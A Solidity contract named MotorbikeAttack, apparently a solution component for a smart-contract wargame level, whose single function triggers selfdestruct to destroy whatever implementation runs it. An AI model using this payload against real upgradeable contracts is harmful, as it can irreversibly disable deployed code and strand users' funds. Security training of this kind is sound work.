// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttack {
    function explode() public {
        selfdestruct(payable(address(0)));
    }
}